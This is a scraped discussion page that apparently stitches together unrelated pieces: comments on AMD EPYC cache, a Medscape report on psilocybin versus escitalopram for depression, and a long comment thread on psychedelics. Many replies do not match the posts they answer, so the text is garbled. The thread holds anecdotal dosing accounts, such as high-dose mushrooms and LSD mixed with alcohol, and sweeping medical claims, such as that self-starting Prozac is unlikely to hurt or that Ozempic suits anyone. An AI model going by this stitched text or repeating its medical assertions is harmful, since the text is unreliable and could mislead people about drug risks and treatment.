agorootparentCCDs can't access each other's L3 cache as their own (fabric penalty is too high to do that directly). Assuming it's anything like the 9174F that means it's really 8 groups of 2 cores that each have 64 MB of L3 cache. Still enormous, and you can still access data over the infinity fabric with penalties, but not quite a block of 512 MB of cache on a single 16 core block that it might sound like at first. Zen 4 also had 96 MB per CCD variants like the 9184X, so 768 MB per, and they are dual socket so you can end up with a 1.5 GB of total L3 cache single machine!

If nothing else, it has a bigger die and heat spreading to pull heat from, it should be easier to maintain thermal headroom on the EYPC chip. That being said, it looks most probable what a 9175F is just a 9755 (their absolute max full size Zen5 core part) with nearly all (7/8) of their cores per CCD disabled in order to get all 512MB of cache. This means that there's a lot of extra interconnect being kept running per core which certainly would contribute to the higher TDP. Of course, in principle this should also mean that each core (which should basically have all of a CDD's IO and cache available to it) should be screaming fast in real terms. Of course finally, TDP is a totally fluffy number. The TDP of the 7950X3D is most probably as low as it is because of how much internal thermal resistance (the extra V-Cache layer) it has. Part of it's lower TDP isn't because \"it's efficient\", part of it is because \"if we run it hotter, we'll melt it\".

Addressing a Treatment 'Mismatch' The findings are important because they address \"a mismatch\" between what psychiatrists and what patients think is important, Barba told Medscape Medical News. \"Psychiatrists really focus on negative symptoms of depression. So, if you are not sad anymore, if your sleep or appetite is not impaired, they think you're better. But if you look at what patients define as important, they say it's the degree in which their life is meaningful, in which they can connect with people around them, in which they can function in everyday life,\" Barba said. \"The study suggests that psilocybin therapy might be a more holistic treatment option for depression,\" added co-first author David Erritzoe, MD, PhD, clinical director and deputy head of the Centre for Psychedelic Research, Imperial College London. \"This could make a substantial difference in the overall happiness and daily activities of those suffering from depression, providing a more joined-up approach to mental health treatment.\" The initial single-center study included 59 adults with MDD (mean age, 41 years) who were randomized to receive either psilocybin or escitalopram over a 6-week period. The psilocybin arm (n = 30) received two 25-mg oral doses of psilocybin therapy (PT), and the escitalopram arm (n = 29) received 10-20 mg of daily escitalopram plus two (placebo-like) 1-mg doses of psilocybin (ET). Both groups received psychological support. Based on change in depression scores on the 16-item Quick Inventory of Depressive Symptomatology-Self-Report (QIDS-SR-16) at week 6, the initial study results suggested non-inferiority between the two treatments in terms of depressive symptoms (primary outcome), but superiority of PT for secondary outcomes including \"well-being, anhedonia, social functioning, sexual functioning, and related variables, with fewer side effects compared to ET,\" the researchers noted. The new 6-month follow-up findings, with monthly questionnaires and no additional study treatment or psychiatric treatment restrictions, measured the QIDS-SR-16, plus Work and Social Adjustment Scale (WSAS), Meaning in Life Questionnaire, Flourishing Scale (FS), and Watts Connectedness Scale (WCS). Again, both groups maintained similar results on the QIDS-SR-16, with slightly greater reductions in depressive symptoms for PT in the first month (positive false discovery rate [FDR] = 0.021), but not thereafter. At both 3 and 6 months, there were greater improvements in WSAS scores for the PT group (pFDR < 0.001 and pFDR = 0.01, respectively), and also greater improvements in meaning in life across all follow-up timepoints (pFDR < 0.001). There was also greater improvement in the PT group regarding WCS at both 3 and 6 months (pFDR = 0.02, and pFDR = 0.04) and comparable FS improvements for both groups across all timepoints. Confounding follow-up interventions may have muddied the results, with 30.7% of PT participants and 43.5% of ET participants receiving an additional intervention during this period. The researchers conclude that while a short course of SSRIs combined with intensive therapeutic support (around 20 hours) \"might be enough to induce sustained antidepressant effects,\" patients treated with psilocybin showed greater improvements in general functioning, connectedness, and meaning in life. Although not reassessed in the follow-up, the initial study showed that adverse events, particularly sexual functioning, favored psilocybin, said Barba. \"The two treatments seemed to go in opposite directions with psilocybin seeming to improve it and the antidepressant to suppress it. Other side effects associated with psilocybin were less diverse — mainly headaches at the end of the day — but with escitalopram they were way more diverse and more impairing,\" he added. Although many therapists may be unfamiliar with psilocybin-assisted psychotherapy, \"it's not a difficult skill to master. It might require some specialization, but I think if you're a good psychotherapist, you can learn how to implement psilocybin into your practice,\" he said. \"Normally the journey is quite inward, so patients do not require active support during the psychedelic experience [around 6 hours]. Sometimes they do require some hand-holding, or helping them to 'let go', or breathing exercises. The important part is the integration work that comes afterwards,\" Barba added. He said he envisions a therapy program that involves \"psychiatrists working together with psychotherapists. The psychotherapists would be more in charge of the active guiding, and the psychiatrist would do the prescribing, with the follow-up psychological support on Zoom.\" He added a word of caution for therapists that \"psilocybin requires active confrontation of painful, negative emotions and people who take this drug need to be open and prepared for the idea that they are going into a state where they may probably end up crying and confronting whatever they are maybe running away from in their lives. Not everyone may want to do this.\" A New Treatment Paradigm? Commenting on the research for Medscape Medical News, Johan Lundberg, MD, PhD, adjunct professor of psychiatry at the Department of Clinical Neuroscience, Karolinska Institute, Stockholm, Sweden, said the study addresses a key outstanding question about the long-term effects of one or two doses of psilocybin. \"It's a 6-month follow-up of a short treatment intervention, so in that sense, it's of high interest. It has been talked about that psilocybin might have a long-term effect, but this is the first study that has followed this for a longer term.\" But Lundberg also pointed out that one shortcoming of the study is the diversity of treatments following the intervention. \"They didn't have control over whether patients received other treatments or when they started. So, that is a key concern. But they transparently reported that, and we do know there was a difference in reported ability to perform activities of daily life, and that is important.\" He added that if psilocybin is eventually approved, it would likely come with an education package for providers — \"which is already the case with other treatments like ECT [electroconvulsive therapy] or TMS [transcranial magnetic stimulation] — you have to learn how to do it.\" James Rucker, MD, PhD, psychiatrist and senior clinical lecturer at King's College London, London, England, who was not involved in the research, also noted that they have tended to attribute differences observed in this study to comparative differences between the drugs themselves. However, he noted, it is also possible that the results reflect biased reporting between groups. This is more likely here because studies involving psilocybin tend to attract those with positive preconceptions about psilocybin and negative preconceptions about conventional antidepressants, and study participants were unblinded during the long-term follow-up phase, so knew which condition they were allocated to. \"This said, the nature of depression varies hugely between individuals, and this calls for the development of a similarly varied suite of treatment paradigms. Psilocybin therapy is certainly a different paradigm of treatment to escitalopram. The observation of similar levels of effectiveness to antidepressants here is encouraging to see alongside the much larger trials of psilocybin currently underway here in the UK, Europe, and the US,\" Rucker added. This work was supported by The Alexander Mosley Charitable Trust and by the founding partners of Imperial College London's Centre for Psychedelic Research. Barba reported having received consulting fees from Adamo Bioscience. Both Lundberg and Rucker are involved in psilocybin research, but neither reported financial links. 0 Credit Lead image: Science Photo Library/Getty Images Medscape Medical News © 2024 WebMD, LLC Send comments and news tips to news@medscape.net.

I don't trust the system to use them responsibly. I'd rather obtain and use them on my own than as part of some private - or governmental - initiative. There's no one to trust more than a good friend to be there for you when the ride gets bumpy, not some guy in a suit doing it for the money. reply DiscourseFan 3 hours agoprevOk like most of you I’ve taken psychedelic drugs. I’ve had bad experiences sure, but I’m fine now. The issue is that what people generally say, like, “oh sometimes you need to encounter your demons,” maybe that will be temporarily traumatizing—in general people recover from that. The real issues are…more complex. More complex than any diagnoses in the DSM can cover. The brain is very complicated, and everyone’s brain is a bit different, and we do not know, really, what goes on in there when you take a drug like Psilocybin. Sometimes something gets a little knocked out of place, and the system doesn’t fully recover. The last time I took a very high dose of psychedelics I couldn’t think straight for a few weeks after. Thoughts came out of nowhere, I had no control over them; often the constant, unceasing flow of thought was distressing and uncomfortable. Thankfully I could still talk to people—talking made me better. I got plenty of sleep, cut out all drugs, even caffiene, got regular exercise and ate a very healthy diet: about a year and a half later I was back to my old habits. But it wasn’t an easy recovery, and certainly not one any psychiatrist could’ve treated adaquetely. But, now I know to be more careful in the future. reply dimal 2 hours agoparent> we do not know, really, what goes on in there when you take a drug like Psilocybin FYI, same goes for SSRIs. The scientific consensus is that the serotonin deficiency theory of depression was wrong. When SSRIs actually work, we still don’t know why. I’ve had bad trips, too. Very bad, but I still think that psilocybin (in a controlled, supportive setting) is a better bet. My bad trips were all due to being in bad settings and being completely unprepared for what could go wrong. I was young and dumb and just fucking around. But tripping in positive supportive settings was incredibly helpful. And if we do find a way to do this right, then people don’t have to take drugs for the rest of their lives. Psychiatric drugs are generally lifelong sentences, and negative side effects tend to compound over time, which often leads to polypharmacy, and more side effects. reply Levitating 1 hour agorootparentSSRIs barely work. For mild to moderate depression a placebo works similarly or better. Only for severe cases of depression are SSRIs found to be helpful because they surpress all emotion. reply drakonka 49 minutes agorootparentMaybe the effect is different when prescribed for something other than depression, but I did not find my SSRI to suppress my emotions. It simply helps me curb rumination and negative thought spirals. Helps to feel \"lighter\" and simultaneously more grounded. If anything, that allows me to feel _more_ positive emotion rather than suppressing it. reply dymax78 39 minutes agorootparentprev~50% response rate for people with major depressive disorder isn't \"barely working\" -- for millions of people, SSRIs significantly improve their quality of life. Unfortunately, there is no \"one size fits all\" solution and often those of us with MDD have to try different medications, in conjunction with a (good) therapist before we find what works best. Personally, I've run the gamut on SSRIs and they never suppressed all emotion. reply grandpoobah 1 hour agorootparentprevWorked great for me. Placebo might have worked too, but doctors don't prescribe those! reply DiscourseFan 2 hours agorootparentprevI agree. But I don’t think psychedelics are the end all be all, that’s all reply brandall10 10 minutes agoparentprevWhy did you take a very high dose? As someone who was experienced with psilocybin some 20+ years ago, I always took fairly consistent doses (roughly 3 grams), as I could sense taking much more would be playing with fire. This was pretty much a given amongst my circle of a dozen friends who experienced these trips with me… hero doses were almost never a good or healthy idea. Fun to read about on Erowid though, mostly as cautionary tales. My time with the substance ended after two bad trips (after a few dozen great ones over a period of 5 years), but neither produced any sort of even minor lasting effect. reply peepee1982 1 hour agoparentprevAnyone who has ever tried to fine-tune medication for psychological issues knows how challenging it can be to get the dosages and combinations just right. In my experience, even medications within the same class can have different effects on different people, especially when combined with drugs from other classes. The interactions between medications, as well as the patient’s individual response, are hard to predict. These reactions can change over time, too, as bodies and brains adapt, and lifestyles shift. Yet, you often hear oversimplified statements like \"depression means you have too little serotonin,\" \"feeling sluggish means you lack noradrenaline,\" or \"difficulty focusing means you have too little dopamine.\" These explanations are so reductive that they barely make sense. The more I read about drug trials, the more I realize how little I — and even many professionals — truly understand about how these medications work and the best way to make informed treatment decisions. reply hackernewds 2 hours agoparentprevDid you take it in a controlled environment like the study suggests? Every time serious conversation of medical progress comes up, it's polluted by naysayers with anecdata about how they took it while raving beside a live volcano. We need to give psychedelics a fair chance, and sure after we can discount them. The article suggests at scale there is potential reply phoronixrly 2 hours agorootparentIn my experience (this thread, too), the conversation gets polluted by people that swear by their self-medication and call more cautious people naysayers. reply feoren 2 hours agorootparentHow come every time we try to have a conversion, it always ends up all \"point counterpoint\" and \"personal experience with the topic\" and \"differing personal experience\" and \"discussion of how those experiences relate to the topic\"!? EVERY TIME! reply DiscourseFan 2 hours agorootparentIts almost as if all experience is subjective… reply phoronixrly 2 hours agorootparentprevThe only valuable conversation about such research is an objective discussion of the quality of the study at hand. reply DiscourseFan 2 hours agorootparentprevIn the pre-modern world people had a very different relationship to death and there wasn’t anything like anxiety as its experienced today. Psychedelics are essentially an attempt to bring someone back to a more “authentic” experience of life before technological controls settled in. Perhaps its better to take the chance? I think so, but I want others to recognize it as a genuine risk that is truly unpredictable and not a personal failing on the part of the user. reply griffzhowl 55 minutes agorootparentI wonder what you mean by saying there wasn't anything like anxiety as it's experienced today in the premodern world. The term \"anxiety\" comes from Latin \"anxietas\", and Old English had \"angsumnes\", both with apparently similar meanings, so it seems the idea has been around for a while, and most likely because it's a basic human emotional condition that could occur in various circumstances throughout history and prehistory. As for a relationship to death, it's difficult to generalise over all people throughout history, but for example in medieval Europe where you had a seemingly quite vivid belief in the possibility of hell after life, that could result in some extreme anxiety of the most inescapable kind. Maybe that accounts for some of the more extreme behaviours of those times, who knows. reply washadjeffmad 22 minutes agoparentprevI had a profoundly difficult trip that affected me deeply. It felt eternal, and when I emerged, I could feel it in my head like some antimemetic parasite that fed off disgust and terror. I can still remember the feeling, twenty years later, if I try, so I don't. I had to learn how not to be influenced by it, and in doing so, learned about myself. And as I changed, because I was aware of what I knew, I knew when I'd changed. Our selves are not immutable, steady states. Our experiences shape us. It's a lesson learned to guard that carefully and jealously. reply dingnuts 13 minutes agorootparentfunny, I could have written the same post but about boring old general anesthesia given before surgery reply bugbuddy 2 hours agoparentprev> Ok like most of you I’ve taken psychedelic drugs.

I've not done that. And not had any seriously bad experiences. Maybe like everything else is all about moderation? reply DiscourseFan 3 hours agorootparentIt was 500ug of LSD mixed with probably 6 or 7 drinks of alcohol. Suffered serotonin syndrome for a few days afterwards. Regardless I’ve heard stories of people having severe long term psychological issues from even relatively light doses, simply because of how their body in particular interacted with the drug. reply alemanek 1 hour agorootparentThat’s a massive dose and you mixed it with alcohol. That is in no way a responsible way to try out psychedelics. You are right that everyone reacts differently which is why you don’t take a very large dose mixed with other drugs. Anecdotally, ayuasca quite literally saved my life and helped me tremendously when I was spiraling into a deep depression. Psychedelics when taken responsibly in a controlled environment under supervision can help a lot of people. reply AnthonBerg 2 hours agorootparentprevThank you for telling the story. To me, it’s interesting to consider the inflammatory aspects – the immunomodulatory effects of LSD and other psychedelics on one hand and alcohol on the other. It’s well established but little-known that psychedelics have a very significant inflammation-reducing effect which includes drastic reduction of neuroinflammation. (I’m fairly sure that this is a primary reason why they work for depression and anxiety; There’s basically always elevated inflammatory biomarkers with these disorders. Stress is directly causative of neuroimflammation.) Here’s a really solid review paper from 2017 – today a lot more knowledge has been accumulated: https://www.frontiersin.org/journals/immunology/articles/10.... Alcohol is known to be pro-inflammatory. I have a hunch that these two disjoint forces on the same physiological systems can have made things worse. reply me551ah 2 hours agorootparentprev500ug of LSD isn’t really a standard dose. It’s almost double your typical dose. reply Galaxeblaffer 2 hours agorootparent250ug of good acid is still a very high dose! 500ug is more like triple of a typical sane dose. milage may vary i guess but 300ug sent me out of this world reply notfed 42 minutes agorootparentprevAccording to Erowid, a \"light\" dose is 25ug-75ug, a \"standard\" dose is 50ug-150ug, and a \"heavy\" dose is 400ug+. reply Nesco 2 hours agorootparentprevI know a guy who took 1000ug. He told me he had side effects / visual glitches for about an entire week reply farts_mckensy 2 hours agorootparentprevIt's such a bad idea to combine alcohol with psychedelics. You should lead off with exactly what you took so as not to mislead others. reply DiscourseFan 2 hours agorootparentAs I said my experience incurred more risk of severe long term side effects, but those are possible in any circumstance with any psychedelic with even a single, low dose. reply fluorinerocket 2 hours agorootparentprev500ug is nuts reply hmcq6 30 minutes agorootparentprevYou got serotonin syndrome from LSD?

Anyhow I expect you to be fairly young so that explains it somewhat. If you're 50 though then it's double weird :) reply farts_mckensy 3 hours agoparentprevI'm a little ambivalent about this response. It sounds like you're describing invasive thoughts of some kind, though your description is vague. At any rate, despite the perceived negative effects, by your own account, it apparently spurred you to lead a healthier life; in other contexts, this is precisely the thing that is praised when it comes to psilocybin. reply DiscourseFan 2 hours agorootparent> it apparently spurred you to lead a healthier life No, I stopped mostly after I’d recovered. And I definitely wasn’t “healthier” then, just addled. reply zozbot234 3 hours agoparentprevTaking psychedelics is a bit like trying to fix a Swiss watch with a sledgehammer: it might just work, but that's not the way to bet. Therapy and well-guided meditative practice can be a lot gentler than that. reply namaria 1 hour agorootparentThis isn't some erowid report. This is actually about studies being made by professional researchers who are publishing their results. Evidence based medicine is always better than layman opinions like 'psychedelics are a mental sledgehammer'. reply jrflowers 42 minutes agorootparentprevConversely, for some people trying to fix depression with therapy and guided meditation can be a bit like trying to fix a Swiss watch with therapy and guided meditation. Everybody is different! reply earnesti 2 hours agorootparentprevI agree, that taking psychedelics is likely not a good idea. But the analogue gives in my opinion totally wrong picture of the actual risks. Psychedelics, at least psilocybin, are quite harmless compared to almost any other substances. The reason for that is that they aren't very habit forming. Personally I used psilocybin recreationally back in the days. Got once bad experience and ended up in a psychosis and to hospital. I got better in couple of days and long term effects were nonexistent. Then I have couple of friends whose basic substances are just legal alcohol and cigarettes, and boy have they fucked their lives with those. It just takes a long time to do it that but psilocybin for sure does not lead to that kind of path. reply AnthonBerg 2 hours agorootparentprevThere is actually a ton of incredibly fascinating knowledge about what psychedelics do – neuroimmunobiologically the effects are profoundly interesting. It’s a surprisingly sharp and specific instrument, certainly double-edged though. https://www.frontiersin.org/journals/immunology/articles/10.... reply bandyaboot 2 hours agorootparentprevThis is sort of how the mechanism of psychedelics fixing depression comes across to me as well. But, surely there must be much more to it, since, as you’re of course aware, fixing a Swiss watch with a sledgehammer will have a very low success rate. The other end of the analogy spectrum could be that it’s a bit like a chemical catalyst. There’s a lot of resistance to a reaction happening on its own, but will very likely happen if given the proper jolt. reply wizzwizz4 2 hours agorootparentA better analogy might be \"fixing a heart attack with your fists\". It might work, if the problem is fibrillation or a blocked artery and if the impact resolves it… or it might just cause further injury without resolving anything. (Or it might resolve the heart attack, but then cause a stroke a few minutes later.) reply phoronixrly 2 hours agorootparentprevThank you for the balanced opinion. It's a rarity here. reply cubefox 3 hours agoprevUnfortunately it's hardly possible to do proper case control studies with psilocybin, since the psychedelic effects cause unblinding.

It means we should be more skeptical of non-blinded studies (or worse studies that pretend to be blind), and we should look for alternative ways to address biases. reply dontwearitout 24 minutes agoparentprevI've never found it compelling that blinding isn't possible for drug-naive patients. There are other drugs that could induce a \"trip\" and an unfamiliar individual could mistake for a minor psychedelic experience. reply teaearlgraycold 3 hours agoparentprevYou could compare against other psychedelics.

Especially a comparison with LSD seems interesting. However, if both perform similarly, this could either mean they both work or they both don't work. reply kjkjadksj 3 hours agoparentprevHardly an issue.

I have a close friend who tried LSD as a last resort to get the best of his severe depression and suicidal thoughts (after being on SSRIs for his entire life) and just one session completely removed his suicidal thoughts for months. After this experience he repeats this whenever he feels the dark thoughts are coming back and it always curbs them down almost completely. It’s mind-blowing how well it worked for him. reply foobiekr 27 minutes agoparentprevSame. I came to them as an older person (late 40s) who basically had only tried pot a few times prior, and nothing at all before late thirties. I don't drink. My few experiences, the first few times, over the course of a year, spread apart by 3-4 months, went from extremely dark to .. just positive, except the last one, where I had no visuals, no bliss at all, and just came to terms with something else in our lives that was going wrong. The dark ones were rage and anger, and now it seems just gone, like there's nothing there. Like a weight lifted, and seemingly long term. reply agumonkey 4 hours agoparentprevIs it something that you still take here and there or was it a time limited therapy ? Congrats on finding a cure for your ailments reply neom 4 hours agorootparentI did 3 sessions of 8 grams in silent darkness for 3 weekends in a row and that basically \"beat the devil out of me\" as they say - it was very very difficult, and a lot of work, but well worth it.I've only felt the \"brain haze\" (I call it) once since then, I took a gram and went for a long walk in the forest, back to no haze. It's been about 7/8 months and I can feel the \"haze\" building in my mind again, so I plan to do another 1g in the forest sometime in the coming weeks. However, my personal experience has been that Psilocybin != Psilocybin - the mushroom itself is super important to the process, much like Indica and Sativa have different ways of connecting you to the mind and the aether, Psilocybin (at least for me) VERY much is the same thing, and it's much starker than cannabis is. Getting into woo-woo land here so apologize: I have some concern that just \"Psilocybin\" isn't a good prescription, that the \"spirit\" that works on you is unique to the mushroom family, and that both not knowing the mushroom to prescribe and also being clinical about it (Psilocybin vs Mushroom) may not be a good direction to go in to help people with their issues. I also think that about LSD, it might work a bit for a while, but imo it's not the best tool. reply tristanMatthias 2 hours agorootparentTotally agree. The variance between species can be dramatic! 2.5 grams of Golden teacher was a standard trip, vs 0.5 grams of PES Amazonian was enough to send my friend into a full blown “awakening” (physical responses and everything).

Then 4-actyl DMT, sometimes call psilacetin, became broadly available. This is a synthetic pro-drug for psilocin, just as psilocybin is a naturally-occurring pro-drug for psilocin. After that, the opinion that the mushroom per se had anything to do with the experience became very rare. It turns out that psilocin is meaningfully different from, in particular, LSD, 2C-B, and MD(M)A. There's definitely something special about it. But that something is also present when it comes in vitro, not just in vivo. reply infamouscow 4 hours agorootparentprevPsilocybin tolerance starts building immediately.

I've commented on this elsewhere, but with psychedelics in particular we wind up in a weird space around our normal approaches to health - for instance, there's a lot of effort right now on finding the chemical mechanisms by which psychedelics affect mood, with the goal of creating substances which have the same impact on depression without the phenomenology of the trip. My suspicion is the trip is the treatment, or at least part of it - that the experience of being in an entirely different mindstate, of reacting to the world in a fundamentally different way using different mental pathways for several hours - is a core part of the treatment. Medicine has a bad habit of ignoring the patient's lived experience - to look at the patient broadly as a mechanism, and particularly as a collection of mechanisms, and to see things like hypertension* as something to be treated with a chemical offset and not a reflection of the full factors of a person's life. My hope is that the psychedelics will help us recognize a paradigm shift here (like, in data leading to changes in practice, not just in their normal way), but I think they've still got too much of the taint of the hippie on them to really be taken seriously. * I'm using hypertension as just an example of a particular ailment, I'm not making a statement on the treatment hypertension in particular. reply phoronixrly 4 hours agoparentprev> I often hear people talk about the risks of psychedelics, which are to be considered, but what’s the risk of doing nothing or withholding the best treatment?

Straightforward to use, low potential for misuse, requires sustained use for any intended effects. A doctor who already has familiarity with a patient's mild or moderate symptoms of anxiety or depression may very well just prescribe one if asked and if not contraindicated. Not that you should randomly start popping Prozac, but it's unlikely to hurt you if you did. Ask your doctor, try the things that doctors currently believe are most likely to work first.

For example, it took literally two decades after it became well known that peptic ulcers were mostly caused by bacteria for the medical community to embrace giving anti-biotics for GI pain. To this day, there are still many American doctors who don't actually know about the Nobel Prize given in 2000 for this discovery, and claim it's \"stress\" and tell you to go home. Some claim they \"know\" but than try to \"change your gut PH\" and still refuse to give antibiotics due to \"superbug\" risk. This is a \"small\" thing (GI pain is not small to those who have it) - but if the doctors are screwing up such a small thing institutionally, what else do they mess up on? One is travelers sickness. Doctors in the USA do not want to perscribe front line antibiotics for it because of fear of superbugs - but they'll uncritically go eat their lunch at a McDonalds that same day, where they consume meat bathed in antibiotic slop which is more likely to contribute to superbugs then the amoxicillin that they didn't give you would have. Or what about right now, when it's become clear that Ozempic is literally a super-drug. Every doctor on earth should be trying to give that stuff to literally anyone. I can go to \"third world countries\" with deregulated health systems and get infinitely better care that I have real control over for on the orders of 1 USD (that's how much it cost for me in Thailand to get front line antibiotics for travelers sickness INCLUDING THE DOCTORS VISIT!) Why do we still sell Neosporin despite doctors wanting it off the market (also for risk of superbugs)? Why do few people in America use Providone-iodine for wound treatment despite it being by far the best solution scientifically for it (and it stains yellow)? Maybe it's because we're stupid. There really aren't better explanations. What about Circumcision? I'd straight up put doctors who do it in jail and many European nations would do the same. American doctors think circumcision is just fine, and long, deeply bitter swaths of medical ethics journals are dedicated to fighting over this again and again. Or what about the widespread disagreement over even basic stuff like digital rectal exams? There's no agreement on if they are worth it because often sticking one's hand up the butt of an old man does more damage to them than finding out that they (like everyone else at old age) have benign prostate cancer?

Yet another unconvincing study with bad journalism. reply el_nahual 2 hours agoprevWill add a personal anecdote on my mental-health journey and the impact psylocibin has had on my life. Bio: - Late 30s. - Long history of depression my entire life. \"Melancholic\" child. Bad drunk teenager. Suicidal in college (failed attempt). - No drugs except alcohol until I was in my mid 20s. I've been prone to major bouts of depression my entire life. I went to therapy multiple times a week for years and got on SSRI's towards the end of university as a response to a failed (but serious) suicide attempt. SSRI's never did anything for me except make me feel like shit (and not be able to take one). Eventually I went off them and sort of got by, and I managed to stay safe by drinking no alcohol. Therapy twice a week was an utter waste of time and money. Then, sort of on a whim, I grew some mushrooms at home with my then fiancée and we took them together. I was mid 20s and had no prior experience with any drug but alcohol. Not knowing what I was doing, we took a BIG dose. I had a trip that was fun at first and then became quite unenjoyable. For the next twelve months I felt like myself again. The change was subtle but, over a long term, quite obvious. After about 18 to 24 months, my depression came back. We took mushrooms again and the same thing happened. A year of well being in exhcange for 2 fun hours and 6 tough ones. So about every two years I'll take a big (2-4g dry) dose of mushrooms and...it's like magic. I feel like myself again. I'm \"back.\" Life is not happy, none of my problems go away, but I feel like I'm an agent in my own life as opposed to a spectator. The well being lasts about a year or 18 months (less if I've been drinking alcohol). It's almost never as bad as when I was suicidal, but it still sucks. For me depression is like being a professional chef and one day your taste buds make everything taste like ash. Or a painter and one day you see colors less and less. Last year I went into a VERY deep depression, so deep that I refused to take mushrooms until my wife basically forced me to. Same thing. The very next day I felt like \"I was back.\" Those things changed my life. I've since had fun with other drugs maybe 5 times. Acid a couple times, molly a couple times. Cheap (wtf) fun for a half a day, but nothing like the impact mushrooms have on my mind. I've had one bad trip while taking mushrooms recreationally. I don't understand who would take those things for fun, at night. Strictly during the day, well-rested, with loved ones, and in nature! I'm also convinced that the impact they have on me is purely chemical. It has nothing to do with \"facing my demons\" or \"connecting with a higher spirit\" or anything like that. I just get off my stupid rut. \"Neurons that fire together wire together\" as they say, and when I'm depressed it's the stupid neurons that fire together. Mushrooms makes a whole different set fire, and fire hard, and that seems to be enough. The deepeest lesson I've gotten while on shrooms is: \"I'm trying my best. Everything is actually fine.\" Pretty good lesson. reply 8b16380d 4 hours agoprevFunny, psilocybin has been largely detrimental to the mental health of everyone I know. reply giantg2 3 hours agoparent\"Funny, psilocybin has been largely detrimental to the mental health of everyone I know.\" This statemwnt is true for the people I know who have used it in a recreational manner.

Mescaline is _rough_.

Note, that I am not trying to impart any sort of mystical value to this, or trying to be poetic. It's an incredibly scary experience that makes you feel like you're disintegrating in a metaphysical sense. Your mind, perception, body. Yourself. Like you're falling apart, being disassembled and that you will never be able to get yourself together again. You have no agency. And then you are gone. I believe this is what they call \"ego death\". And then after you're gone, you're left with all these pieces of yourself. Including a lot of them that you forgot ever existed. Or how they fit together. Or some that you were subconsciously aware of but never perceived them. Like opening a shelf of Legos from your childhood. It's very dream-like. Then comes the awareness, understanding and grief. I've never cried as much in my life, and I'm not a crying person. Then comes hope. And you get to assemble yourself back again. Feels like something between waking up, coming back to reality and a chain-reaction of those \"AHA!\" moments. And then you're back, but you're not the same, and you understand more about yourself. While the next few months were some of the best I had in decades, I'm extremely averse to repeating this experience, as it feels really traumatic. I was in a controlled, safe, although not a clinical environment, and I am terribly aware how much this can fuck your brain up in ways I can probably never imagine. We have no idea how this machine works and this is basically decompiling an incredibly complex binary during execution, moving code around, recompiling, and hoping it works. reply sub7 3 hours agoprevI do LSD once a year with close friends and a beautiful view and it's fantastic at making me appreciate beauty in the world and feel like everything is in it's natural place.

There would definitely be a noticeable effect, but for someone who hasn't studied the effects of psilocybin, they may not realize it. The downside is that in order to keep the duration similar, you'd probably have to administer the salvinorin using an IV drip, and a six hour salvia trip could quite possibly be too traumatic. reply parpfish 4 hours agorootparentIt might be nice to also have a non-psychedelic non-sari as well.

Study design and methods: > \"All the patients provided written informed consent and after discontinuing any pre-trial antidepressants, enrollees received two oral doses of psilocybin (1 mg or 25 mg) with accompaniment from two experienced therapists for ∼6–8 h, separated by 3 weeks, as well as daily pills (escitalopram 10–20 mg or placebo capsules). Thirty patients were randomised to PT and 29 to ET.\" > 'The PT condition consisted of two high-dose (25 mg) treatment sessions with the serotonergic psychedelic psilocybin, administered with support from two study therapists...and daily placebo capsules. The ET condition consisted of daily doses of the selective serotonin reuptake inhibitor (SSRI) escitalopram - 10 mg for three weeks followed by 20 mg for a further three weeks—as well as equivalent psychological support including dosing sessions with placebo-like doses of psilocybin (1 mg).\" This is an interesting way to address the placebo issue, giving a noticeable microdose of psilocybin (1 mg) versus the active dose (25 mg) for the non-control group. Fundamentally I think psilocybin's main overall psychological effect is to push subconscious issues up into the mind's conscious processing space. Large doses can generate visual hallucinations related to those subconscious issues which can be unpleasant, even terrifying, for many people, so that's why caution is warranted. Extremely large doses cause complete dissociation from external sensory input, which is of course very dangerous for the unprepared individual in an uncontrolled situation - an experience unlikely for any herbivore to want to repeat, hence the evolutionary selection pressure for biosynthesis of such compounds by plants and fungi. reply jdietrich 5 hours agoprevObligatory notes of caution: The primary outcome of depression symptoms (QIDS-SR-16) was not significantly different between the groups. The sample size is small and unrepresentative of the real-world population of depression patients - the trial participants are very disproportionately male and university-educated. There are obvious and much-discussed issues with blinding in psychedelic trials. These results point to a treatment that may be superior to treatment-as-usual for a minority of patients, but the results certainly aren't revolutionary. There is still the potential for significant risk in wider clinical populations who may have psychiatric comorbidities that would exclude them from trials like this, and in delivering psychedelic treatments in more normal clinical settings that are likely to be far less carefully controlled than a clinical trial. reply chiefalchemist 4 hours agoprevWhen this topic comes up on HN I'm always sure to mention the book: \"How to Change Your Mind\" by Michael Pollan There's also a Netflix doc series based on the book. https://michaelpollan.com/books/how-to-change-your-mind/ reply keepamovin 4 hours agoprevBut no patent, so this is \"misinformation\" haha reply jtrn 3 hours agoprevThis comment ignores the possible effectiveness of both psilocybin and SSRIs and focuses on the usefulness of the research itself. I actually believe that both have a role in psychiatry, but this study tells me nothing with regards to therapy. Working as a clinical psychologist, who also reads a lot of research, this study is just another brick in the wall that I am banging my head against when it comes to doing actual evidence-based therapy. I actually read the entire paper and the pre-registration. The title on Medscape and the article are, to me, completely reading the research wrong, and just another example of the actual research design and findings living in a different universe than the press release and subsequent discussion. Let me try to communicate why I feel this way by summarizing the research in my way, as opposed to the title: \"Psilocybin Bests SSRI for Major Depression in First Long-Term Comparison.\" Hers my take: Research finds no significant difference between psilocybin and SSRI in the primary outcome from pre-registration (self-reported depression on an emailed form), even when only administering SSRI for 6 weeks, where the maximum effect of SSRI is expected at 12 weeks. As such, this does not even qualify as standard treatment with SSRI. This is after excluding 90% of the applicants for the study. The effectiveness is primary supported by p-hacking, as seen by reporting additional measures not in the registered, where some of them favor psilocybin. And SSRI actually scores BETTER in the main outcome. Now, someone might come along and call me cynical, mistaken, or worse. But having been through this with biofeedback, metacognitive therapy, light therapy, mindfulness therapy, and ketamine treatment already, I can clearly see the same pattern: lying by omission, p-hacking, not taking into account the \"decline effect,\" borderline acceptable results. It all culminates in a big nothingburger, and any progress for my field remains stagnant. Based on the quality of this study, I am certain that if we just aggressively started treating depression with psilocybin, I just know that it wouldn't make much difference, because I have been through it before with the exact same numbers and effect sizes, just different treatment modalities. Here is the best indication I found for SSRI: Resistant phobic anxiety (panic attacks that don't stop even after long exposure), and burnout-related depression (person worked normally their whole life but is suddenly just empty of energy and does not look forward to anything with joy). These are examples that very often make a big difference with SSRI, in conjunction with therapy. Psilocybin seems to work best for existential depression and anxiety that is driven by pathological self-focus (not egotism, but inability to stop focusing on one's own inner states). But these personal theories are just that, and the studies that keep getting funding are very seldom useful, at least for me, as I genuinely am trying my best to help my patients. reply krzat 14 minutes agoparentPsychiatry seems to be very symptom based, depression is an umbrella term for many completely different problems that show as \"big sad\".

